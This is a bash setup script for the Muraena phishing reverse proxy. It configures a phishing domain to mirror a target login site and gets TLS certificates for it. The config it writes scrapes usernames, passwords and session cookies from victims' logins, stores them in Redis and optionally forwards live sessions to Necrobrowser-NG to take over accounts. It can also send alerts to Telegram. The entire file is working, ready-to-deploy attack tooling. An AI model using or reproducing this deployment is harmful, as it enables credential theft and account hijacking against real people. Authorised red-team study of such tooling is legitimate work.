#!/usr/bin/env bash
set -euo pipefail

# ─────────────────────────────────────────────────────────────────────────────
# Muraena — plug-and-play setup script
# Generates config, handles TLS, wires Necrobrowser-NG, starts everything.
#
# Interactive:       ./setup.sh
# Non-interactive:   ./setup.sh --ci   (reads from environment variables)
#
# CI environment variables:
#   MURAENA_PHISHING_DOMAIN   required  your phishing domain
#   MURAENA_TARGET_DOMAIN     required  domain to proxy
#   MURAENA_TLS_MODE          1=letsencrypt  2=self-signed  3=none (default: 3)
#   MURAENA_TRACKING          true/false (default: true)
#   MURAENA_SESSION_MODE      1=store-only  2=necro-docker  3=necro-external (default: 1)
#   MURAENA_NECRO_ENDPOINT    required when SESSION_MODE=3
#   MURAENA_NECRO_COOKIES     comma-separated trigger cookie names (default: sessionToken)
#   MURAENA_NECRO_TASK_TYPE   e.g. office365, github, generic (default: generic)
#   MURAENA_TELEGRAM_TOKEN    optional
#   MURAENA_TELEGRAM_CHAT_ID  optional
# ─────────────────────────────────────────────────────────────────────────────

CI_MODE=false
[[ "${1:-}" == "--ci" ]] && CI_MODE=true

BOLD="\033[1m"
GREEN="\033[32m"
YELLOW="\033[33m"
RED="\033[31m"
CYAN="\033[36m"
RESET="\033[0m"

info()    { echo -e "${GREEN}[+]${RESET} $*"; }
warn()    { echo -e "${YELLOW}[!]${RESET} $*"; }
error()   { echo -e "${RED}[✗]${RESET} $*"; exit 1; }
section() { echo -e "\n${BOLD}${CYAN}── $* ──${RESET}"; }
ask()     { echo -e "${BOLD}$1${RESET}"; }

# ── prerequisites ─────────────────────────────────────────────────────────────

check_deps() {
    local missing=()
    for cmd in docker git openssl; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        error "Missing required tools: ${missing[*]}\nInstall them and re-run this script."
    fi

    # docker compose v2
    if ! docker compose version &>/dev/null; then
        error "Docker Compose v2 not found. Install Docker Desktop or the compose plugin."
    fi
    info "All prerequisites met."
}

# ── gather config ─────────────────────────────────────────────────────────────

gather_config() {
    if [[ "$CI_MODE" == true ]]; then
        # ── non-interactive: read from environment variables ──────────────────
        PHISHING_DOMAIN="${MURAENA_PHISHING_DOMAIN:?MURAENA_PHISHING_DOMAIN must be set}"
        TARGET_DOMAIN="${MURAENA_TARGET_DOMAIN:?MURAENA_TARGET_DOMAIN must be set}"
        TLS_CHOICE="${MURAENA_TLS_MODE:-3}"
        TRACKING_CHOICE="${MURAENA_TRACKING:-Y}"
        SESSION_MODE="${MURAENA_SESSION_MODE:-1}"
        NECRO_COOKIES="${MURAENA_NECRO_COOKIES:-sessionToken}"
        NECRO_TASK_TYPE="${MURAENA_NECRO_TASK_TYPE:-generic}"
        TG_TOKEN="${MURAENA_TELEGRAM_TOKEN:-}"
        TG_CHAT_ID="${MURAENA_TELEGRAM_CHAT_ID:-}"

        if [[ "$SESSION_MODE" == "2" ]]; then
            NECRO_ENDPOINT="http://necrobrowser:3000/instrument"
        elif [[ "$SESSION_MODE" == "3" ]]; then
            NECRO_ENDPOINT="${MURAENA_NECRO_ENDPOINT:?MURAENA_NECRO_ENDPOINT must be set when SESSION_MODE=3}"
        fi

        if [[ -n "$TG_TOKEN" && -n "$TG_CHAT_ID" ]]; then
            TG_CHOICE="Y"
        else
            TG_CHOICE="N"
        fi

        info "CI mode — config loaded from environment variables."
        info "  Domain   : ${PHISHING_DOMAIN} → ${TARGET_DOMAIN}"
        info "  TLS mode : ${TLS_CHOICE}"
        info "  Sessions : ${SESSION_MODE}"
        return
    fi

    # ── interactive prompts ───────────────────────────────────────────────────
    section "Core Configuration"

    ask "Phishing domain (e.g. evil.example.com):"
    read -r PHISHING_DOMAIN
    [[ -z "$PHISHING_DOMAIN" ]] && error "Phishing domain is required."

    ask "Target domain to proxy (e.g. accounts.google.com):"
    read -r TARGET_DOMAIN
    [[ -z "$TARGET_DOMAIN" ]] && error "Target domain is required."

    section "TLS / HTTPS"
    echo "  1) Let's Encrypt (certbot — domain must point at this server)"
    echo "  2) Self-signed   (good for LAN / testing)"
    echo "  3) None          (plain HTTP, port 8080)"
    ask "Choose [1/2/3]:"
    read -r TLS_CHOICE
    TLS_CHOICE="${TLS_CHOICE:-3}"

    section "Tracking"
    ask "Enable victim tracking? [Y/n]:"
    read -r TRACKING_CHOICE
    TRACKING_CHOICE="${TRACKING_CHOICE:-Y}"

    section "Session Handling"
    echo "  What should Muraena do with captured cookies and credentials?"
    echo ""
    echo "  1) Store only     — save to Redis; inspect manually with redis-cli"
    echo "  2) Store + send   — save to Redis AND forward to Necrobrowser-NG"
    echo "                      (runs Necrobrowser-NG in Docker automatically)"
    echo "  3) Store + send   — save to Redis AND forward to an existing"
    echo "                      Necrobrowser-NG instance you already have running"
    echo ""
    ask "Choose [1/2/3] (default: 1):"
    read -r SESSION_MODE
    SESSION_MODE="${SESSION_MODE:-1}"

    if [[ "$SESSION_MODE" =~ ^[23]$ ]]; then
        if [[ "$SESSION_MODE" == "3" ]]; then
            ask "Necrobrowser-NG endpoint URL (e.g. http://10.0.0.5:3000/instrument):"
            read -r NECRO_ENDPOINT
            [[ -z "$NECRO_ENDPOINT" ]] && error "Endpoint is required."
        else
            NECRO_ENDPOINT="http://necrobrowser:3000/instrument"
        fi

        ask "Cookie name(s) that signal a live session (comma-separated, e.g. sessionToken,authCookie):"
        read -r NECRO_COOKIES
        NECRO_COOKIES="${NECRO_COOKIES:-sessionToken}"

        ask "Task type in Necrobrowser-NG (e.g. office365, github, generic):"
        read -r NECRO_TASK_TYPE
        NECRO_TASK_TYPE="${NECRO_TASK_TYPE:-generic}"
    fi

    section "Telegram Alerts"
    ask "Enable Telegram alerts? [y/N]:"
    read -r TG_CHOICE
    TG_CHOICE="${TG_CHOICE:-N}"

    if [[ "$TG_CHOICE" =~ ^[Yy]$ ]]; then
        ask "Bot token:"
        read -r TG_TOKEN
        ask "Chat ID (e.g. -1001234567890):"
        read -r TG_CHAT_ID
    fi
}

# ── TLS setup ─────────────────────────────────────────────────────────────────

setup_tls_letsencrypt() {
    # Skip if certs already exist (idempotent for CI re-runs)
    if [[ -f config/cert.pem && -f config/privkey.pem ]]; then
        info "TLS certificates already present — skipping Let's Encrypt request."
        return
    fi
    command -v certbot &>/dev/null || {
        warn "certbot not found — installing via snap..."
        snap install --classic certbot && ln -sf /snap/bin/certbot /usr/bin/certbot
    }
    info "Requesting certificate for ${PHISHING_DOMAIN}..."
    certbot certonly --standalone --non-interactive --agree-tos \
        --register-unsafely-without-email -d "$PHISHING_DOMAIN"
    local base="/etc/letsencrypt/live/${PHISHING_DOMAIN}"
    cp "${base}/cert.pem"      config/cert.pem
    cp "${base}/privkey.pem"   config/privkey.pem
    cp "${base}/fullchain.pem" config/fullchain.pem
    info "Certificates saved to config/"
}

setup_tls_selfsigned() {
    # Skip if certs already exist (idempotent for CI re-runs)
    if [[ -f config/cert.pem && -f config/privkey.pem ]]; then
        info "TLS certificates already present — skipping self-signed generation."
        return
    fi
    info "Generating self-signed certificate for ${PHISHING_DOMAIN}..."
    openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
        -keyout config/privkey.pem \
        -out    config/cert.pem \
        -subj   "/CN=${PHISHING_DOMAIN}" \
        -addext "subjectAltName=DNS:${PHISHING_DOMAIN}" 2>/dev/null
    cp config/cert.pem config/fullchain.pem
    info "Self-signed certificate generated (browsers will show a warning)."
}

# ── write config.toml ─────────────────────────────────────────────────────────

write_config() {
    local tls_enable="false"
    local port="8080"
    local http_redirect="false"

    case "$TLS_CHOICE" in
        1|2)
            tls_enable="true"
            port="443"
            http_redirect="true"
            ;;
    esac

    local tracking_enable="false"
    [[ "$TRACKING_CHOICE" =~ ^[Yy]$ ]] && tracking_enable="true"

    local necro_block=""
    if [[ "$SESSION_MODE" =~ ^[23]$ ]]; then
        # Build comma-separated cookie list as TOML array
        IFS=',' read -ra COOKIE_ARR <<< "$NECRO_COOKIES"
        local cookie_toml=""
        for ck in "${COOKIE_ARR[@]}"; do
            ck="$(echo "$ck" | xargs)"  # trim spaces
            cookie_toml+="\"${ck}\", "
        done
        cookie_toml="[${cookie_toml%, }]"

        necro_block="
[necrobrowser]
    enable   = true
    endpoint = \"${NECRO_ENDPOINT}\"
    profile  = \"./config/instrument.necro\"

    [necrobrowser.trigger]
        type   = \"cookies\"
        values = ${cookie_toml}
        delay  = 10"
    fi

    local tg_block=""
    if [[ "$TG_CHOICE" =~ ^[Yy]$ ]]; then
        tg_block="
[telegram]
    enable   = true
    botToken = \"${TG_TOKEN}\"
    chatIDs  = [\"${TG_CHAT_ID}\"]"
    fi

    cat > config/config.toml <<TOML
# Generated by setup.sh — $(date -u +"%Y-%m-%d %H:%M UTC")

[proxy]
    phishing    = "${PHISHING_DOMAIN}"
    destination = "${TARGET_DOMAIN}"
    port        = ${port}

    [proxy.HTTPtoHTTPS]
        enable   = ${http_redirect}
        HTTPport = 80

[transform]
    [transform.base64]
        enable  = false
        padding = ["=", "."]

    [transform.response]
        skipContentType = ["font/*", "image/*"]

[log]
    enable = true

[redis]
    host = "redis"
    port = 6379

[tls]
    enable      = ${tls_enable}
    expand      = false
    certificate = "./config/cert.pem"
    key         = "./config/privkey.pem"
    root        = "./config/fullchain.pem"
    minVersion  = "TLS1.2"
    renegotiationSupport = "Never"

[tracking]
    enable             = ${tracking_enable}
    trackRequestCookie = true

    [tracking.trace]
        identifier = "_uid"
        validator  = "[a-zA-Z0-9]{8}"
        header     = "X-Track"

        [tracking.trace.landing]
            type   = "query"
            header = "X-Landing"

[tracking.secrets]
    paths = ["/login", "/signin", "/auth", "/session"]

    [[tracking.secrets.patterns]]
        label = "Username"
        start = "username="
        end   = "&"

    [[tracking.secrets.patterns]]
        label = "Password"
        start = "password="
        end   = "&"
${necro_block}
${tg_block}
TOML

    info "config/config.toml written."
}

# ── write instrument.necro ────────────────────────────────────────────────────

write_necro_profile() {
    local task_type="${NECRO_TASK_TYPE:-generic}"
    cat > config/instrument.necro <<JSON
{
  "name": "%%%TRACKER%%%",
  "task": {
    "type": "${task_type}",
    "name": ["ScreenshotPages"],
    "params": {
      "fixSession": "https://${TARGET_DOMAIN}",
      "credentials": %%%CREDENTIALS%%%
    }
  },
  "cookies": %%%COOKIES%%%
}
JSON
    info "config/instrument.necro written (edit task name/params as needed)."
}

# ── docker-compose override for necrobrowser ─────────────────────────────────

write_compose_override() {
    if [[ "${SESSION_MODE:-1}" == "2" ]]; then
        info "Necrobrowser-NG will be cloned and started in Docker..."

        if [[ ! -d necrobrowser-ng ]]; then
            git clone --depth 1 https://github.com/muraenateam/necrobrowser.git necrobrowser-ng
        else
            info "necrobrowser-ng directory already exists, skipping clone."
        fi

        cat > docker-compose.override.yml <<YML
# Auto-generated by setup.sh — adds Necrobrowser-NG service
services:
  necrobrowser:
    build: ./necrobrowser-ng
    restart: unless-stopped
    ports:
      - "3000:3000"
    depends_on:
      redis:
        condition: service_healthy
    environment:
      - REDIS_HOST=redis
      - REDIS_PORT=6379
YML
        info "docker-compose.override.yml written."
    fi
}

# ── launch ────────────────────────────────────────────────────────────────────

launch() {
    section "Starting Muraena"
    docker compose build --quiet
    docker compose up -d
    echo ""
    info "Muraena is running!"
    echo ""
    echo -e "  ${BOLD}Phishing domain :${RESET} ${PHISHING_DOMAIN}"
    echo -e "  ${BOLD}Proxying        :${RESET} ${TARGET_DOMAIN}"
    if [[ "$TLS_CHOICE" =~ ^[12]$ ]]; then
        echo -e "  ${BOLD}URL             :${RESET} https://${PHISHING_DOMAIN}"
    else
        echo -e "  ${BOLD}URL             :${RESET} http://${PHISHING_DOMAIN}:8080"
    fi

    case "${SESSION_MODE:-1}" in
        1) echo -e "  ${BOLD}Sessions        :${RESET} Store in Redis only" ;;
        2) echo -e "  ${BOLD}Sessions        :${RESET} Store in Redis + auto-forward to Necrobrowser-NG (Docker)" ;;
        3) echo -e "  ${BOLD}Sessions        :${RESET} Store in Redis + auto-forward to ${NECRO_ENDPOINT}" ;;
    esac

    echo ""
    echo -e "  ${BOLD}Inspect Redis   :${RESET} docker compose exec redis redis-cli hgetall victim:<ID>"
    echo -e "  ${BOLD}Logs            :${RESET} docker compose logs -f muraena"
    echo -e "  ${BOLD}Stop            :${RESET} docker compose down"
    echo ""
}

# ── main ──────────────────────────────────────────────────────────────────────

main() {
    echo ""
    echo -e "${BOLD}${CYAN}╔══════════════════════════════════════╗${RESET}"
    echo -e "${BOLD}${CYAN}║     Muraena — Plug & Play Setup      ║${RESET}"
    echo -e "${BOLD}${CYAN}╚══════════════════════════════════════╝${RESET}"
    echo ""

    check_deps
    gather_config

    section "Setting Up TLS"
    case "$TLS_CHOICE" in
        1) setup_tls_letsencrypt ;;
        2) setup_tls_selfsigned  ;;
        *) info "Skipping TLS (HTTP mode)." ;;
    esac

    section "Writing Configuration"
    write_config
    [[ "$SESSION_MODE" =~ ^[23]$ ]] && write_necro_profile
    [[ "$SESSION_MODE" =~ ^[23]$ ]] && write_compose_override

    launch
}

main "$@"
